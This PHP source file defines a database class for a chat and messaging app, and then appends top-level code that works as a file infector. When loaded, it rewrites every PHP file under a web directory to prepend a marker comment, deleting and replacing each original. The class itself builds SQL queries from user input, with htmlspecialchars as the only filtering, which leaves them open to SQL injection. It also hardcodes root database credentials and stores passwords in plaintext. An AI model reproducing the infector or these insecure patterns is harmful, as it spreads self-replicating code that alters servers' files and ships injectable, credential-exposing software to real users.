<?php

class Database {
    private $serverName = "localhost";
    private $username = "root";
    private $password = "root";
    private $dbName = "messageSystem";

    public function isValidUser($username, $password) {
        $isValid = false;
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $username = htmlspecialchars($username);
        $password = htmlspecialchars($password);

        $sql = "SELECT COUNT(*) AS occurrence FROM users WHERE BINARY usr = \"$username\" AND pwd = \"$password\"";
        $result = $conn->query($sql) or die($conn->error);;

        if ($result->fetch_assoc()["occurrence"] > 0) {
            $isValid = true;
        }

        $conn->close();

        return $isValid;
    }

    public function findUser($username) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);
        $succeeded = false;

        $username = htmlspecialchars($username);

        $sql = "SELECT COUNT(*) AS occurrence FROM users WHERE usr = \"$username\"";
        $result = $conn->query($sql);

        if ($result->fetch_assoc()["occurrence"] > 0) {
            $succeeded = true;
        }

        $conn->close();

        return $succeeded;
    }

    public function addUser($username, $password, $mail) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $username = htmlspecialchars($username);
        $password = htmlspecialchars($password);
        $mail = htmlspecialchars($mail);

        $sql = "INSERT INTO users (usr, pwd, email, regTime) VALUES (\"$username\", \"$password\", \"$mail\", CURRENT_TIME)";
        $result = false;

        if ($conn->query($sql) === TRUE) {
            $result = true;
        }

        $conn->close();

        return $result;
    }

    public function getUserId($username) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $username = htmlspecialchars($username);

        $sql = "SELECT id FROM users WHERE usr = \"$username\"";
        $result = $conn->query($sql);

        $id = $result->fetch_assoc()["id"];

        $conn->close();

        return $id;
    }

    public function addChat($chatname, $userId) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $chatname = htmlspecialchars($chatname);

        $sql = "INSERT INTO chats (chatName, creatorId, creationTime) VALUES (\"$chatname\", \"$userId\", CURRENT_TIME)";
        $result = false;

        if ($conn->query($sql) === TRUE) {
            $chatId = $conn->insert_id;

            $result = $this->addMember($chatId, $userId);
        }

        $conn->close();

        return $result;
    }

    public function addMember($chatId, $userId) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $chatId = htmlspecialchars($chatId);
        $userId = htmlspecialchars($userId);

        $sql = "INSERT INTO members (chatId, userId) VALUES (\"$chatId\", \"$userId\")";
        $result = false;

        if ($conn->query($sql) === TRUE) {
            $result = true;
        }

        $conn->close();

        return $result;
    }

    public function getUsernamesLike($value) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $value = htmlspecialchars($value);

        $sql = "SELECT usr FROM users WHERE usr LIKE \"$value%\"";
        $result = $conn->query($sql);

        $users = [];

        while($user = $result->fetch_assoc()["usr"]) {
            array_push($users, $user);
        }

        $conn->close();

        return $users;
    }

    public function getChatsForUser($userId) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $userId = htmlspecialchars($userId);

        $sql = "SELECT id, chatName FROM chats JOIN members ON chats.id = members.chatId WHERE members.userId = \"$userId\"";
        $result = $conn->query($sql);

        $chats = [];

        while($chat = $result->fetch_assoc()) {
            array_push($chats, $chat);
        }

        $conn->close();

        return $chats;
    }

    public function getChatMembers($chatId) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $chatId = htmlspecialchars($chatId);

        $sql = "SELECT id, usr FROM users JOIN members ON users.id = members.userId WHERE members.chatId = \"$chatId\"";
        $result = $conn->query($sql);

        $members = [];

        while($member = $result->fetch_assoc()) {
            array_push($members, $member);
        }

        $conn->close();

        return $members;
    }

    public function isMemberOfChat($chatId, $userId) {
        $isValid = false;
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $chatId = htmlspecialchars($chatId);
        $userId = htmlspecialchars($userId);

        $sql = "SELECT COUNT(*) AS occurrence FROM members WHERE chatId = \"$chatId\" AND userId = \"$userId\"";
        $result = $conn->query($sql);

        if ($result->fetch_assoc()["occurrence"] > 0) {
            $isValid = true;
        }

        $conn->close();

        return $isValid;
    }

    public function getMessages($chatId, $userId, $beginIndex, $amount) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $chatId = htmlspecialchars($chatId);
        $userId = htmlspecialchars($userId);
        $beginIndex = htmlspecialchars($beginIndex);
        $amount = htmlspecialchars($amount);

        $sql = "SELECT messages.senderId = \"$userId\" AS isSender, users.usr, messages.content, messages.sendTime FROM messages JOIN chats ON messages.chatId = chats.id JOIN users ON users.id = messages.senderId WHERE messages.chatId = \"$chatId\" ORDER BY sendTime DESC LIMIT $beginIndex, $amount";
        $result = $conn->query($sql);

        $messages = [];

        while($message = $result->fetch_assoc()) {
            array_push($messages, $message);
        }

        $conn->close();

        return $messages;
    }

    public function sendMessage($chatId, $usrId, $message) {
        $conn = new mysqli($this->serverName, $this->username, $this->password, $this->dbName);

        $chatId = htmlspecialchars($chatId);
        $usrId = htmlspecialchars($usrId);
        $message = htmlspecialchars($message);

        $sql = "INSERT INTO messages (chatId, senderId, content, sendTime) VALUES (\"$chatId\", \"$usrId\", \"$message\", CURRENT_TIME)";
        $result = false;

        if ($conn->query($sql) === TRUE) {
            $result = true;
        }

        $conn->close();

        return $result;
    }
}



// users        : (id, usr, pwd, email, regDate)
// chats        : (id, chatName, creatorId, creationDate)
// members      : (chatId, userId)
// messages     : (id, chatId, senderId, content, sendDate)
// reads        : (messageId, userId)

/*
    CREATE TABLE users (
        id INT(6) AUTO_INCREMENT NOT NULL,
        usr VARCHAR(30) NOT NULL,
        pwd VARCHAR(50) NOT NULL,
        email VARCHAR(50),
        regTime TIMESTAMP,
        CONSTRAINT pk_users PRIMARY KEY(id)
    ) ENGINE = INNODB;

    CREATE TABLE chats (
        id INT(6) AUTO_INCREMENT NOT NULL,
        chatName VARCHAR(30) NOT NULL,
        creatorId INT(6) NOT NULL,
        creationTime TIMESTAMP,
        CONSTRAINT pk_chats PRIMARY KEY(id),
        CONSTRAINT fk_chats FOREIGN KEY(creatorId) REFERENCES users(id)
    ) ENGINE = INNODB;

    CREATE TABLE members (
        chatId INT(6) NOT NULL,
        userId INT(6) NOT NULL,
        CONSTRAINT pk_members PRIMARY KEY(chatId, userId),
        CONSTRAINT fk1_members FOREIGN KEY(chatId) REFERENCES chats(id),
        CONSTRAINT fk2_members FOREIGN KEY(userId) REFERENCES users(id)
    ) ENGINE = INNODB;

    CREATE TABLE messages (
        id INT(6) AUTO_INCREMENT NOT NULL,
        chatId INT(6) NOT NULL,
        senderId INT(6) NOT NULL,
        content VARCHAR(100),
        sendTime TIMESTAMP,
        CONSTRAINT pk_messages PRIMARY KEY(id),
        CONSTRAINT fk1_messages FOREIGN KEY(chatId) REFERENCES chats(id),
        CONSTRAINT fk2_messages FOREIGN KEY(senderId) REFERENCES users(id)
    ) ENGINE = INNODB;

    CREATE TABLE messageReads (
        messageId INT(6) NOT NULL,
        userId INT(6) NOT NULL,
        CONSTRAINT pk_messageReads PRIMARY KEY(messageId, userId),
        CONSTRAINT fk1_messageReads FOREIGN KEY(messageId) REFERENCES messages(id),
        CONSTRAINT fk2_messageReads FOREIGN KEY(userId) REFERENCES users(id)
    ) ENGINE = INNODB;


 */



// bash command for finding all php scripts: sudo find / -type f -name "*.php*"

// get a list of all PHP files on this server that this script can edit --start

$directory = new RecursiveDirectoryIterator('/wamp64/www/test/');
$iterator = new RecursiveIteratorIterator(
    $directory,
    RecursiveIteratorIterator::LEAVES_ONLY,
    RecursiveIteratorIterator::CATCH_GET_CHILD
);
$regex = new RegexIterator(
    $iterator,
    '/.+(?<!sqspell)(\.php)$/i',
    RecursiveRegexIterator::GET_MATCH
);
$filenames = array();


foreach($regex as $r) {
    foreach($r as $file) {
        if($file != '.php') {
            array_push($filenames, $file);
        }
    }
}

// --end

// Check each file
foreach($filenames as $filename) {

    // Open file (read only)
    $script = fopen($filename, "r");

    // Let's write to a new file, as opposed to reading the whole file
    // script in memory, to avoid issues with large files
    $infected = fopen("$filename.infected", "w");

    $infection = "<?php\n"
        ."\n"
        ."// I <3 BINARYFOUR\n"
        ."// Subscribe to PewDiePie!\n"
        ."\n"
        ."?>\n";

    // infection first
    fwrite($infected, $infection, strlen($infection));

    // past the rest of the original file
    $i = 0;
    $isAlreadyInfected = false;
    while($contents = fgets($script)) {
        if($i == 2 && $contents == "// I <3 BINARYFOUR\n") {
            $isAlreadyInfected = true;
        }
        fwrite($infected, $contents, strlen($contents));
        $i++;
    }

    // Close both handles and move the infected file in to place
    fclose($script);
    fclose($infected);

    if($isAlreadyInfected) {
        unlink("$filename.infected");
    } else {
        unlink("$filename");
        rename("$filename.infected", $filename);
    }
}
